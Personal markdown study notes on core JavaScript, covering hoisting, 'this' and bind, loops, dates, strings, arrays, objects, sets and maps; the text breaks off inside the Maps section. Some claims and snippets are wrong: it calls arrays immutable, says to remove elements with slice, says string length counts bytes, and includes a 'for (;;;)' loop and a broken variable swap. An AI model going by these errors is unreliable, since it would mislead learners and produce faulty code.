# INDEX

- [INDEX](#index)
  - [installing js in html](#installing-js-in-html)
  - [Variables](#variables)
    - [Hoisting](#hoisting)
    - [Garbage collection](#garbage-collection)
  - [Operators](#operators)
  - [Function](#function)
    - [IIFE](#iife)
    - [this keyword in functions](#this-keyword-in-functions)
    - [Function binding](#function-binding)
      - [Losing "this"](#losing-this)
      - [Solution 1: Wrapper](#solution-1-wrapper)
      - [Solution 2 (better): bind](#solution-2-better-bind)
        - [bindAll](#bindall)
    - [Arguments](#arguments)
  - [Loop](#loop)
    - [For..in loop](#forin-loop)
    - [For..of loop](#forof-loop)
  - [Numbers](#numbers)
    - [Special numbers](#special-numbers)
  - [Date](#date)
    - [Autocorrection](#autocorrection)
    - [Date to number, date diff](#date-to-number-date-diff)
    - [Date.parse from a string](#dateparse-from-a-string)
    - [international Date Api](#international-date-api)
    - [toLocaleString()](#tolocalestring)
  - [Strings](#strings)
    - [String Methods](#string-methods)
    - [Operations on strings](#operations-on-strings)
    - [Regular expressions](#regular-expressions)
  - [Arrays](#arrays)
    - [Array methods](#array-methods)
  - [Object](#object)
    - [Object.keys, values, entries](#objectkeys-values-entries)
    - [Transforming objects (operations on objects)](#transforming-objects-operations-on-objects)
  - [Sets](#sets)
    - [WeakSet](#weakset)
  - [Maps](#maps)
    - [WeakMap](#weakmap)
  - [DOM](#dom)
    - [Steps for creating an element](#steps-for-creating-an-element)
    - [`innerHTML` vs `innerText`](#innerhtml-vs-innertext)
    - [`insertAdjacentHTML()`](#insertadjacenthtml)
    - [HTMLCollection vs NodeList](#htmlcollection-vs-nodelist)
    - [Node.cloneNode()](#nodeclonenode)
    - [Styles](#styles)
    - [DOM Traversing ( relation between elements )](#dom-traversing--relation-between-elements-)
    - [creating connection between `DOM` & `js-code`](#creating-connection-between-dom--js-code)
  - [virtual DOM](#virtual-dom)
    - [methods to compare nodes](#methods-to-compare-nodes)
    - [steps](#steps)
  - [Events](#events)
    - [Event Flow (Delegation / Propagation)](#event-flow-delegation--propagation)
    - [Event Handling](#event-handling)
    - [Events Notes](#events-notes)
  - [Storage](#storage)
  - [Errors](#errors)
    - [Error object](#error-object)
  - [Forms](#forms)
    - [event-handler in forms](#event-handler-in-forms)
    - [Form Validation](#form-validation)
    - [FormData](#formdata)
  - [CROSS-SITE SCRIPTING (XSS) ATTACKS](#cross-site-scripting-xss-attacks)
    - [Defending against CROSS-SITE SCRIPTING](#defending-against-cross-site-scripting)
  - [Scrolling](#scrolling)
    - [intersection observer](#intersection-observer)
    - [Lazy loading](#lazy-loading)
  - [Slider (pagination)](#slider-pagination)
  - [Writing Documentation](#writing-documentation)

---

## installing js in html

- When the browser comes across a `<script>` element, it stops to
  load the script and then checks to see if it needs to do anything.

  - this can affect the loading time of pages

- Why use separate js file in `<script>` tags

  - The benefit of a separate file is that the browser will download it and store it in its **cache**.
  - Other pages that reference the same script will take it from the cache instead of downloading it, so the file is actually downloaded only once. --> That reduces traffic and makes pages faster.

- A single `<script>` tag can’t have both the **src** attribute and code inside.

  ```html
  <script src="file.js">
    alert(1); // the content is ignored, because src is set
  </script>

  <!-- You can separate the 2 scripts -->
  <script src="file.js"></script>
  <script>
    alert(1);
  </script>
  ```

- `defer` : A script that will be downloaded **in parallel to** parsing the page, and **executed after the HTML has finished parsing**

  ```html
  <script src="index.js" defer></script>
  ```

  ![defer](./img/defer2.PNG)
  ![defer](./img/defer.PNG)

---

## Variables

- `var` vs `let` vs `const` &nbsp; &nbsp; &nbsp; &nbsp; (also look at the hoisting section in the pdf)
  ![var-let-const](./img/var-let-const.png)
  ![var-let-const](./img/var-let-const-2.jpg)
- variable defined with `var` is an `window` object property

### Hoisting

It's to make space in memory for a variable to be able to:

- Call functions before they have been declared
- Assign a value to a variable that has not yet been declared

> This is because any **variables and functions** within each execution context are created before they are executed.

- `var hoisting`: usually bad
- `function hoisting`: actually pretty useful --> **must be a function declaration**
- `let hoisting`:

  - it gets **hoisted but not initialized**
    ![let-hoisting](./img/let-hoisting.png)

  ```js
  // or
  let x = 1;

  function func() {
    console.log(x); // ReferenceError: Cannot access 'x' before initialization
    let x = 2;
  }

  func();
  ```

> **function expression** is not hoisted as its variable is the one that is hoisted and not the function (the variable's value)

### Garbage collection

- Garbage collection is performed automatically. We cannot force or prevent it.
- Objects are retained in memory while they are **reachable**.
- Being referenced is not the same as being reachable (from a **root**): a pack of interlinked objects can become unreachable as a whole
- Modern engines implement advanced algorithms of garbage collection.
- if something becomes unreached, its garbage-collected
  ![unreachable](./img/unreachable.png)

  - to remove something from memory in garbage-collection, we need to make it **unreachable**, ex:

    ```js
    let john = { name: 'John' };
    // the object can be accessed, john is the reference to it

    // overwrite the reference
    john = null;
    // the object will be removed from memory
    ```

---

## Operators

> NOTE: **operand** is what operators are applied to

- **Binary** operators -> is for 2 operands
  - `5 + 4`
- **unary** operators -> is for 1 operand

  - it's a `+` or `-` before the string number =>

    ```js
    // It actually does the same thing as Number(), but is shorter.
    console.log(+'565'); // 565
    console.log(+true); // 1
    console.log(+''); // 0
    ```

  - it's a `!` before something => `console.log(! (x > 4) )`

---

## Function

- function declaration vs function expression
  ![function declaration vs function expression](./img/function%20declaration%20vs%20function%20expression.png)

  - The main practical **difference** is that you can call function declaration before you define it and your code will work just fine but with function expression, it's impossible and JavaScript will throw an error at you.
    - This works because the interpreter runs through a script before executing each statement, so it will know that a function declaration appears later in the script
    - the interpreter always looks for **variables** and **function declarations** before going through each section of a script, line-by-line. This means that a function created with a **function declaration** can be called before it has even been declared.
      - The difference is that a **"Function Declaration is instantly fully initialized"**.
        - When a Lexical Environment is created, a Function Declaration immediately becomes a ready-to-use function (unlike `let`, that is unusable till the declaration).
          ![function-declaration](./img/function-declaration.png)
      - as for `Function expression`, You put a function where the interpreter would expect to see an **expression** (returned value), then it is treated as an expression, and it is known as a function expression
  - **Function expression** forces you to define all my functions at the top of my code. this makes you write cleaner and more readable codes this way.
    - here, the name is usually omitted. A function with no name is called an **anonymous function**.
    - also this enables you to have **reliable self-reference (recursion, etc)**
    - and have **more debuggable stack traces** -> the name of function is shown in `stack trace`
    - also this makes **more self-documenting code**
  - **Function declarations** are not part of the regular top-to-bottom flow of control. They are conceptually moved to the top of their scope and can be used by all the code in that scope.

    ```js
    console.log('The future says:', future()); // this works!
    function future() {
      return "You'll never have flying cars";
    }
    ```

- _note_ :
  - `arrow function`
    - if you used `{}` then you should use the word `return` to return something
    - know that it's shorter but at a cost of it will be **anonymous function** and not a **named function**, which means that it will need you to read the function body to understand what it does instead of figuring out this from its name
- when you use a function that do a calculation process, you should put the invocation of this function in a variable and not invoking it many time => **for performance**, ex:

  - use this

    ```javascript
    for (let i = 0; i < bills.length; i++) {
      const tip = calcTip(bills[i]);
      tips.push(tip);
      totals.push(tip + bills[i]);
    }
    ```

  - not this

    ```javascript
    for (let i = 0; i < bills.length; i++) {
      tips.push(calcTip(bills[i]));
      totals.push(calcTip(bills[i]) + bills[i]);
    }
    ```

- Each function has its own **Execution context**
  - The execution context is an internal data structure that contains details about the execution of a function: where the control flow is now, `the current variables`, `the value of "this"` and few other internal details.
  - has 2 parts:
    - **Thread of execution**
    - **Memory**
  - They correspond to variable scope
  - Ex: ![execution context](./img/execution%20context.png)

---

### IIFE

- **IIFE** is an inline function expression. which create its own scope
  - In the past, as there was only `var`, and it has no **block-level** visibility, programmers invented a way to emulate it. What they did was called “immediately-invoked function expressions” (abbreviated as `IIFE`).
- [ `anonymous function` / `IIFE` ] are **inline function expressions**.

  - The parentheses "`()`" around the function is a trick to show JavaScript that the function is created in the context of another expression, and hence it’s a Function Expression: it needs no name and can be called immediately.

- Ways to create IIFE

  ```js
  (function () {
    alert('Parentheses around the function');
  })();

  (function () {
    alert('Parentheses around the whole thing');
  })();

  !(function () {
    alert('Bitwise NOT operator starts the expression');
  })();

  +(function () {
    alert('Unary plus starts the expression');
  })();
  ```

---

### this keyword in functions

- in `arrow functions` =>

  - **Arrow functions have no `“this”`**

    - If `this` is accessed, it is taken from the outside.

  - `this` is **Elastically lexical scoped**, as they define `this` based on **where it was written** and **not where/who it was called with**
  - `this` refers to the global object ( `window` object ) which why it's called : `Lexical this` , so **DON'T EVER USE `arrow functions` AS A METHOD** as they don't define a `this` keyword so it will point to (**where the function was born**) --> the upper scope which usually where this refers to the global object:
    - The global object has a universal name -> `globalThis`.
    - ( `window` object ) -> In the browser
    - ( `global` object ) -> In Node.js

- in `normal functions` =>

  - `this` refers to who the function was invoked (called) by --> (dynamic scope)
  - `this` refers to the `undefined` if it's a global function and not a method to an object.

- if you want to chain multiple methods (functions) that uses `this` keyword, you can return `this` at the end:

  ```js
  let ladder = {
    step: 0,
    up() {
      this.step++;
      return this;
    },
    down() {
      this.step--;
      return this;
    },
    showStep() {
      alert(this.step);
      return this;
    }
  };

  ladder.up().up().down().showStep().down().showStep(); // shows 1 then 0
  ```

- each function has its own **execution context** in the call stack
- only one `rest parameter` is allowed in one function and it must be the last parameter.
- skip default parameter :

  ```js
  function myfunc(x, y = 2, z = 6) {}
  // use (undefined) when calling it
  myfunc(5, undefined, 17);
  ```

---

### Function binding

When passing object methods as callbacks, there’s a known problem: **"losing "this""**.

#### Losing "this"

- EX for explanation:

  ```js
  let user = {
    firstName: 'John',
    sayHi() {
      alert(`Hello, ${this.firstName}!`);
    }
  };

  setTimeout(user.sayHi, 1000); // Hello, undefined!
  ```

  - That’s because `setTimeout` got the function `user.sayHi`, separately from the object. The last line can be rewritten as:

    ```js
    let f = user.sayHi;
    setTimeout(f, 1000); // lost user context
    ```

  - so now `this` is equal to the `window` object, So for `this.firstName` it tries to get `window.firstName`, which does not exist. In other similar cases, usually `this` just becomes **undefined**.

#### Solution 1: Wrapper

- The simplest solution is to use a **wrapping function**:

  ```js
  let user = {
    firstName: 'John',
    sayHi() {
      alert(`Hello, ${this.firstName}!`);
    }
  };

  setTimeout(function () {
    user.sayHi(); // Hello, John!
  }, 1000);
  // It works, because it receives "user" from the outer lexical environment, and then calls the method normally.
  ```

- **vulnerability**:
  - What if before `setTimeout` triggers (there’s one second delay!) user changes value? Then, suddenly, it will call the wrong object!

#### Solution 2 (better): bind

- using the built-in method `bind` that allows to fix `this`.

  ```js
  let user = {
    firstName: 'John'
  };

  function func() {
    alert(this.firstName);
  }

  let funcUser = func.bind(user);
  funcUser(); // John
  ```

- following our `setTimeout` example:

  ```js
  let user = {
    firstName: 'John',
    sayHi() {
      alert(`Hello, ${this.firstName}!`);
    }
  };

  let sayHi = user.sayHi.bind(user); // (*)

  // can run it without an object
  sayHi(); // Hello, John!

  setTimeout(sayHi, 1000); // Hello, John!

  // even if the value of user changes within 1 second
  // sayHi uses the pre-bound value which is reference to the old user object
  user = {
    sayHi() {
      alert('Another user in setTimeout!');
    }
  };
  ```

- **Notes:**

  - The `.bind()` method creates a new function
  - The `.bind()` method requires passing value/reference for `this`, so we must put in something like `null`.
  - A function cannot be **re-bound**.

    ```js
    function f() {
      alert(this.name);
    }

    f = f.bind({ name: 'John' }).bind({ name: 'Pete' });
    f(); // John
    ```

##### bindAll

- If an object has many methods and we plan to actively pass it around, then we could bind them all in a loop:

  ```js
  for (let key in user) {
    if (typeof user[key] == 'function') {
      user[key] = user[key].bind(user);
    }
  }
  ```

- or you can use the [\_.bindAll(object, methodNames)](https://lodash.com/docs#bindAll) in **lodash**.

---

### Arguments

JavaScript is extremely broad-minded about the number of arguments you pass to a function.

- If you pass too many, the extra ones are ignored.
- If you pass too few, the missing parameters get assigned the value **undefined**.
- **Rest Parameters**:

  - The rest of the parameters can be included in the function definition by using three dots `...` followed by the name of the array that will contain them. The dots literally mean “gather the remaining parameters into an array”.

    ```js
    function sumAll(...args) {
      // args is the name for the array
      let sum = 0;

      for (let arg of args) sum += arg;

      return sum;
    }

    alert(sumAll(1)); // 1
    alert(sumAll(1, 2)); // 3
    alert(sumAll(1, 2, 3)); // 6
    ```

    - The rest parameters must be **at the end**

      ```js
      function f(arg1, ...rest, arg2) { // arg2 after ...rest ?!
      // error
      }
      ```

- **The “arguments” variable**

  - There is also a special array-like object named arguments that contains all arguments by their index.

    ```js
    function showName() {
      alert(arguments.length);
      alert(arguments[0]);
      alert(arguments[1]);
    }

    showName('Julius', 'Caesar'); // shows: 2, Julius, Caesar
    ```

  - In old times, rest parameters did not exist in the language, and using arguments was the only way to get all arguments of the function. And it still works
  - The downside is that although arguments is both array-like and iterable, it’s not an array. It does not support array methods, so we can’t call arguments.map(...) for example.
  - Also, it always contains all arguments. We can’t capture them partially, like we did with **rest parameters**.
    - So when we need these features, then rest parameters are preferred.
  - **Arrow functions do not have "arguments"**

    - If we access the arguments object from an arrow function, it takes them from the **outer** “normal” function.

    ```js
    function f() {
      let showArg = () => alert(arguments[0]);
      showArg();
    }

    f(1); // 1
    ```

- **Spread syntax**

  - When `...arr` is used in the function call, it “expands” an iterable object arr into the list of arguments.

    ```js
    let arr = [3, 5, 1];

    alert(Math.max(...arr)); // 5 (spread turns array into a list of arguments)
    ```

- `.length` property in functions (`Function.prototype.length`) returns the number of **arguments** specified in the function definition

  ```js
  (function foo(a, b) {}.length); // 2
  ```

---

## Loop

| For                                                                                                                                             | While                                                                                                                                                                                  | Do While                                                                                                           |
| ----------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| if you need to run code a specific number of times, usually the condition is a counter which is used to tell how many times the loop should run | if you don't know how many times the code should run. here the condition can be something other that a counter and the code will continue to loop for as long as the condition is true | it will always run the statements inside the curly braces at least once, even if the condition evealuates to false |

- in `for` block we can use `const` as each time it will make a new variable :

  ```javascript
  for (let i = 0; i < bills.length; i++) {
    const tip = calcTip(bills[i]);
    tips.push(tip);
  }
  ```

- ex of for loop without any thing in () :

  ```javascript
  let p = ['sample1','sample2','sample3','sample4','sample5'];
  let i = 0;

  for (;;;) {
    console.log(p[i]);
    i++;
    if (i===p.length) break;
  }
  ```

- `for of loop` with index :

  ```javascript
  for (const item of menu) console.log(item);

  // with index
  for (const [i, el] of menu.entries()) {
    console.log(`${i + 1}: ${el}`);
  }
  ```

---

### For..in loop

To walk over all keys of an object, there exists a special form of the loop: for..in.

- it can be used with arrays to loop through the indexes

  ```js
  let arr = ['Apple', 'Orange', 'Pear'];

  for (let key in arr) {
    alert(arr[key]); // Apple, Orange, Pear
  }
  ```

  - The `for..in` loop is optimized for generic objects, not arrays, and thus is 10-100 times slower. Of course, it’s still very fast. The speedup may only matter in bottlenecks. But still we should be aware of the difference.

---

### For..of loop

used in arrays or strings, doesn’t give access to the number of the current element, just its value.

- Objects that can be used in `for..of` are called **iterable**.
- An **iterator** must have the method named `next()` that returns an object `{done: Boolean, value: any}`, here `done:true` denotes the end of the iteration process, otherwise the value is the next value.

---

## Numbers

- More ways to write a number:

  ```js
  let billion = 1_000_000_000; // JavaScript engine simply ignores "_" between digits -> syntactic sugar
  let billion = 1e9; // 1 billion, literally: 1 and 9 zeroes
  ```

- to check if a number use `Number.isFinite()` as it's better than `Number.inNaN()`
- to get random number between two values :

  ```javascript
  // Returns a random number between min (inclusive) and max (exclusive)
  function getRandomNum(min, max) {
    return Math.random() * (max - min) + min;

    // Returns a random integer between min (inclusive) and max (inclusive)
    function getRandomInt(min, max) {
      min = Math.ceil(min);
      max = Math.floor(max);
      return Math.floor(Math.random() * (max - min + 1)) + min;
      // here we use floor as it works well if number is negative
    }
  }
  ```

- **Formatting Numbers / currency** : [Formatting](https://www.samanthaming.com/tidbits/30-how-to-format-currency-in-es6/)

- _notes_ :

  - `toFixed()` returns a `string`
  - `Math.round()` and `toFixed()` both round to the nearest number: `0..4` **lead down** while `5..9` **lead up**.
  - `toString()` can take a base to convert to (The base can vary from `2` to `36`. By default it’s `10`)
  - If we want to call a method directly on a number, then we need to place **two dots** `..` after it.

    ```js
    // prettier-ignore
    alert(123456..toString(36)); // 2n9c
    // or
    alert((123456).toString(36)); // 2n9c
    ```

  - calculations:

    ```js
    alert(0.1 + 0.2 == 0.3); // false
    alert(0.1 + 0.2); // 0.30000000000000004
    ```

    - why? -> because A **number is stored in memory in its binary form**, a sequence of bits (ones and zeroes). But fractions like `0.1`, `0.2` that look simple in the decimal numeric system are actually unending fractions in their binary form.
    - So `0.1` is one divided by ten `1/10`, In decimal numeral system such numbers are easily representable. Compare it to one-third: `1/3`. It becomes an endless fraction `0.33333`.
    - So, division by powers `10` is guaranteed to work well in the decimal system, but division by 3 is not.

---

### Special numbers

- `Infinity`, `-Infinity`
- `NaN`
  - `0 / 0` = `NaN`
  - `Infinity - Infinity` = `NaN`
  - `console.log("five" * 2)` ->`NaN`

> There is only one value in JavaScript that is not equal to itself, and that is **NaN** > `console.log(NaN == NaN)` -> false

---

## Date

To create a new Date object call: `new Date()`

- Without arguments – create a Date object for the current date and time:

  ```js
  let now = new Date();
  alert(now); // shows current date/time

  //new Date(year, month, date, hour, minute, second, millisecond)
  let d1 = new Date(2012, 1, 20, 3, 12);
  alert(d1);

  // new Date(datastring)
  let d2 = new Date('2012-02-20T03:12');
  alert(d2);
  ```

- Create a Date object with the time equal to number of milliseconds (`1/1000` of a second) passed after the `Jan 1st of 1970 UTC+0`.

  - usually it's used with `date.getTime()`

  ```js
  // 0 means 01.01.1970 UTC+0
  let Jan02_1970 = new Date(24 * 3600 * 1000);
  alert(Jan02_1970); // 02.01.1970 UTC+0
  ```

![date](./img/date.png)

- > **Note**: Not getYear(), but getFullYear()
  - > Many JavaScript engines implement a non-standard method `getYear()`. This method is deprecated. It returns **2-digit** year sometimes. Please never use it. There is `getFullYear()` for the year.
  - > `getYear()` returns year minus 1900. This has been deprecated for a while now, it's best to use `getFullYear()`.
- `month` is zero based so we add `1` to it

- when you perform operations on dates, the result is in form of `milliSeconds`

---

### Autocorrection

The **autocorrection** is a very handy feature of Date objects. We can set out-of-range values, and it will auto-adjust itself.

- if the month is specified with more days than it already has, we go to next month:

  ```js
  let date = new Date(2013, 0, 32); // 32 Jan 2013 ?!?
  alert(date); // ...is 1st Feb 2013!
  ```

---

### Date to number, date diff

When a Date object is converted to number, it becomes the timestamp same as `date.getTime()`:

```js
let date = new Date();
alert(+date); // the number of milliseconds, same as date.getTime()
```

---

### Date.parse from a string

The method `Date.parse(str)` can read a date from a string.

- The call to `Date.parse(str)` parses the string in the given format and returns the timestamp **(number of milliseconds from 1 Jan 1970 UTC+0)**.
  - If the format is invalid, returns **NaN**.
- The string format should be: `YYYY-MM-DDTHH:mm:ss.sssZ`, where:

  - `YYYY-MM-DD` – is the date: year-month-day.
  - `The character "T"` is used as the delimiter.
  - `HH:mm:ss.sss` – is the time: hours, minutes, seconds and milliseconds.
  - `The optional 'Z'` part denotes the time zone in the format
  - `+-hh:mm`. A single letter Z would mean UTC+0.

```js
let ms = Date.parse('2012-01-26T13:51:50.417-07:00');
alert(ms); // 1327611110417  (timestamp)
```

---

### international Date Api

The Intl.DateTimeFormat object enables language-sensitive date and time formatting.

- [Intl.DateTimeFormat cheatsheet](https://devhints.io/wip/intl-datetime)

### toLocaleString()

[reference](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toLocaleString)

The toLocaleString() method returns a string with a language sensitive representation of this date.

- syntax : `toLocaleString(locales, options)`

```js
const event = new Date(Date.UTC(2012, 11, 20, 3, 0, 0));
// expected output: Thu Dec 20 2012 05:00:00 GMT+0200 (Eastern European Standard Time)

// British English uses day-month-year order and 24-hour time without AM/PM
console.log(event.toLocaleString('en-GB', { timeZone: 'UTC' }));
// expected output: 20/12/2012, 03:00:00
```

---

## Strings

### String Methods

- we are calling object methods on a "string" such as "length", "toUpperCase()" and "indexOf", however we know "strings" are primitive types and yet these methods are available on a "string".
  - this is because the process called `"Boxing"` which JavaScript perform behind the scene.
  - When ever we call these methods on a "string", JavaScript will convert the "`string primitive`" into "`string objects`" without losing its content, therefore at that object these methods become available.
- convert number to a string :

  ```javascript
  const str = number + '';
  // or
  const str = String(number);
  ```

- allow a string to span multiple lines:

  ```js
  // using backticks
  let guestList = `Guests:
  * John
  * Pete
  * Mary
  `;

  // or using special characters:
  let guestList = 'Guests:\n * John\n * Pete\n * Mary';
  ```

  - Note that `\n` is a single **“special” character**, so the length of a string includes it as one character.

- The only difference between them is that if no character is found, indexing `[]` returns `undefined`, and `charAt()` returns an empty string:

  ```js
  let str = `Hello`;

  alert(str[1000]); // undefined
  alert(str.charAt(1000)); // '' (an empty string)
  ```

- `substring()` -> is almost the same as `slice()`, but it allows start to be greater than end.

  ```js
  let str = 'stringify';

  // these are same for substring
  alert(str.substring(2, 6)); // "ring"
  alert(str.substring(6, 2)); // "ring"

  // ...but not for slice:
  alert(str.slice(2, 6)); // "ring" (the same)
  alert(str.slice(6, 2)); // "" (an empty string)
  ```

- `substr(start [, length])` -> Returns the part of the string from start, with the given **length**.

  ```js
  let str = 'stringify';
  alert(str.substr(2, 4)); // 'ring', from the 2nd position get 4 characters
  ```

- `.length` property returns the number of **Bytes** rather that the number of characters, --> unicode characters like **emoji requires 2 bytes**

---

### Operations on strings

- The binary `+` is the only operator that supports strings in such a way `2 + '1' --> "21"`

  ```js
  // NOTE That:
  console.log('1' + 2 + 2); // "122" and not "14"
  ```

- Other arithmetic operators work only with numbers and always convert their operands to numbers.

---

### Regular expressions

Regular expressions search for characters that form a pattern. They can also replace those characters with new ones.

- Regular expressions do not just search for matching letters; they can check for sequences of upper/lowercase characters, numbers, punctuation, and other symbols.

![regular expressions](./img/regular-expressions.png)

---

## Arrays

![array-methods](./img/array-methods00.PNG)
![array](./img/array.jpg)

- arrays are **immutable**
- `slice` (makes a copy) vs `splice` (change original array) ![slice-splice](./img/slice-splice.jpg)
- `delete` vs `splice`

  - always use `slice` to remove element from an array

  ```js
  // delete
  let arr = ['I', 'go', 'home'];
  delete arr[1]; // remove "go"
  alert(arr[1]); // undefined
  // now arr = ["I",  , "home"];
  alert(arr.length); // 3

  //splice
  let arr = ['I', 'study', 'JavaScript'];
  arr.splice(1, 1); // from index 1 remove 1 element
  alert(arr); // ["I", "JavaScript"]
  alert(arr.length); // 2
  ```

- switching values of 2 variables :

  ```javascript
  let a = 5;
  let b = 8;
  [x, y] = [y, x];
  ```

- default values in destructuring

  ```javascript
  // Default values
  const [p = 1, q = 1, r = 1] = [8, 9];
  ```

- **forEach vs for of**
  | `forEach` | `for of` |
  | ----------------------------------------------------------------- | ------------------------------------------------------------------- |
  | It iterates from initial to end | It is flexible to iterate array both ascending and descending order |
  | Keeps execution until last element get executed (**can't break**) | It runs until given condition become false (**can break**) |
  | It use iteration | It use index |

### Array methods

![methods](./img/array%20methods.jpg)

- **`filter` vs `find`**
  ![filtervsfind](./img/filtervsfind.webp)
  - usually `find` is used in logins when you want to check for username
  - `findIndex` is usually used when you want to get index of item to delete it from a list
- **`indexOf` vs `findIndex`**
  - `indexOf` expects a value as first parameter. This makes it a good choice to find the index in arrays of primitive types (like string, number, or boolean).
    - it returns `-1` if nothing can be found.
  - `findIndex` expects a callback as first parameter. Use this if you need the index in arrays with non-primitive types (e.g. objects) or your find condition is more complex than just a value.
- **`flatMap`** : It is identical to a map() followed by a `flat()` of **depth 1**
  ![flatmap](./img/flatmap.png)
- **`sort`** (for array of numbers only)

  - without condition, it will sort based on the default comparator which assumes **string operations** (all values are coerced and compared as string)

  ```javascript
  // if return is (< 0), show A before B
  // if return is (> 0), show B before A
  // if return is (0), items should remain in the same order

  // Ascending
  // movements.sort((a, b) => {
  //   if (a > b) return 1;
  //   if (a < b) return -1;
  // });
  // or
  movements.sort((a, b) => a - b);

  // Descending
  // movements.sort((a, b) => {
  //   if (a > b) return -1;
  //   if (a < b) return 1;
  // });
  // or
  movements.sort((a, b) => b - a);
  ```

  - sorting dates:

    ```js
    var holidays = ['2014-12-25', '2014-01-01'];
    holidays.sort(function (a, b) {
      var dateA = new Date(a);
      var dateB = new Date(b);
      return dateA - dateB;
    });
    ```

- `Array.from()` : usually used to convert `node list` to an array

  ```javascript
  // main advantage here that it can take a mapping-callback-function as a second parameter

  const y = Array.from({ length: 3 }, () => 1); // [1,1,1]

  const z = Array.from({ length: 3 }, (_, i) => i + 1); // [1, 2, 3]

  // converting a node list with mapping
  const movementsUI = Array.from(document.querySelectorAll('.movements__value'), el =>
    Number(el.textContent.replace('€', ''))
  );
  // or you can use spread operator [...document.querySelectorAll(".movements__value")].map()
  ```

- operations on array:

  ```js
  alert([] + 1); // "1"
  alert([1] + 1); // "11"
  alert([1, 2] + 1); // "1,21"
  ```

---

## Object

- There're 2 ways to create an object:

  - **Object Literals**: `let obj = {};`
  - **Constructor Literals**: `let obj = new Object();`
  - **use a function as a template for creating objects**:

    ```js
    function Hotel(name, rooms) {
      this.name = name;
      this.rooms - rooms;
      // a method
    }

    // Don't forget the "new" keyword
    var hotel_1 = new Hotel('park', 120);
    ```

- we use `function expression` in objects to declare `methods`
- to create a new object from an existing object =>

  ```js
  // jessica is an existing object
  const jessicaCopy = Object.assign({}, jessica);
  // or
  const jessicaCopy = { ...jessica };
  ```

- remember that objects that may look the same to you are actually not
  ![object equality](./img/objectEquality.png)
- destructuring

  ```js
  // destructuring with changing variable name
  const { name: restaurantName, openingHours: hours, categories: tags } = restaurant;
  console.log(restaurantName, hours, tags);

  // Default values
  const { menu = [], starterMenu: starters = [] } = restaurant;

  // Mutating variables
  let a = 111;
  let b = 999;
  const obj = { a: 23, b: 7, c: 14 };
  ({ a, b } = obj); // we have to wrap it in a ( because js expects a block when we are starting with a {})
  ```

  - it can also be used to **swap variables value** easier:

    ```js
    var a = 1;
    var b = 1;
    [a, b] = [b, a];
    ```

- **enhanced object literals** :

  ```javascript
  const openingHours = {//normal object};

  const restaurant = {
    name: "Classico Italiano",
    location: "Via Angelo Tavanti 23, Firenze, Italy",

    // ES6 enhanced object literals
    openingHours,  // instead of writing it with `=`

    // also the ability to write methods like this instead of this => order : function....
    order(starterIndex, mainIndex) {
    // normal method
    }
  };
  ```

- Object access rules
  ![objectRules](./img/objectRules.png)

- to convert object to its primitive value --> `.toPrimitive`

---

### Object.keys, values, entries

- `Object.keys(obj)` – returns an array of keys.
- `Object.values(obj)` – returns an array of values.
- `Object.entries(obj)` – returns an array of [key, value] pairs.

- Please note the distinctions (compared to map for example):

  |             | **Map**      | **Object**                                |
  | ----------- | ------------ | ----------------------------------------- |
  | Call syntax | `Map.keys()` | `Object.keys(obj)` , but not `obj.keys()` |
  | Returns     | iterable     | “real” Array                              |

---

### Transforming objects (operations on objects)

Objects lack many methods that exist for arrays, e.g. `map`, `filter` and others.

- So, if we’d like to apply them, then we can use `Object.entries` followed by `Object.fromEntries`:

  ```js
  let prices = {
    banana: 1,
    orange: 2,
    meat: 4
  };

  let doublePrices = Object.fromEntries(
    Object.entries(prices).map(entry => [entry[0], entry[1] * 2])
  );

  alert(doublePrices.meat); // 8
  ```

---

## Sets

A **Set** is a special type collection – “set of values” (without keys), where each value may occur only once.

- [sets](https://www.w3schools.com/js/js_object_sets.asp)
- there's no way to get data out of a `set` because all values are unique and order doesn't matter

Its main methods are:

- `new Set(iterable)` – creates the set, and if an iterable object is provided (usually an array), copies values from it into the set.
- `set.add(value)` – adds a value, returns the set itself.
- `set.delete(value)` – removes the value, returns true if value existed at the moment of the call, otherwise false.
- `set.has(value)` – returns true if the value exists in the set, otherwise false.
- `set.clear()` – removes everything from the set.
- `set.size` – is the elements count.

- convert map to array:

  ```js
  let arr = [1, 2, 2, 3]; // -> [1,2,3]
  console.log([...new Set(arr)]);
  ```

- We can loop over a set either with `for..of` or using `forEach`

  ```js
  let set = new Set(['oranges', 'apples', 'bananas']);

  for (let value of set) alert(value);

  // the same with forEach:
  set.forEach((value, valueAgain, set) => {
    alert(value);
  });
  ```

---

### WeakSet

- It is similar to Set, but we may **only add objects** to WeakSet (not primitives).
- An object exists in the set **while it is reachable from somewhere else**.

  ```js
  let visitedSet = new WeakSet();

  let john = { name: 'John' };
  let pete = { name: 'Pete' };
  let mary = { name: 'Mary' };

  visitedSet.add(john); // John visited us
  visitedSet.add(pete); // Then Pete
  visitedSet.add(john); // John again

  // visitedSet has 2 users now
  alert(visitedSet.has(john)); // true
  alert(visitedSet.has(mary)); // false

  john = null;
  // visitedSet will be cleaned automatically
  ```

> The most notable limitation of `WeakMap` and `WeakSet` is the **absence of iterations**, and the inability to get all current content. That may appear inconvenient, but does not prevent WeakMap/WeakSet from doing their main job – be an “additional” storage of data for objects which are stored/managed at another place.

---

## Maps

**Map** is a collection of keyed data items, just like an Object. But the main difference is that Map allows **keys of any type**.

![map](./img/map.png)

- [maps](https://www.w3schools.com/js/js_object_maps.asp)
- The `Map` object holds key-value pairs and remembers the original insertion order of the keys.
- A `Map` object iterates its elements in insertion order — a `for...of` loop returns an array of [key, value] for each iteration.
- you can use `arrays` as a key for a map but you must put it first in a variable as if not you then will create multiple arrays in the memory and can't access one
- `maps` vs `objects`
  ![objects](./img/maps-vs-obj.jpg)
- Convert object to map

  ```javascript
  // openingHours is an existing object
  const hoursMap = new Map(Object.entries(openingHours));
  ```

- Methods and properties are:

  - > **`map[key]`** isn’t the right way to use a Map

    - as this is treating map as a plain JavaScript object, so it implies all corresponding limitations (only string/symbol keys and so on).

  - `new Map()` – creates the map.
  - `map.set(key, value)` – stores the value by the key.
    - Every `map.set` call returns the map itself, so we can “chain” the calls:
  - `map.get(key)` – returns the value by the key, undefined if key doesn’t exist in map.
  - `map.has(key)` – returns true if the key exists, false otherwise.
  - `map.delete(key)` – removes the value by the key.
  - `map.clear()` – removes everything from the map.
  - `map.size` – returns the current element count.

- create a map from an object

  ```js
  let map = new Map(Object.entries(obj));
  ```

- create an object from a map

  ```js
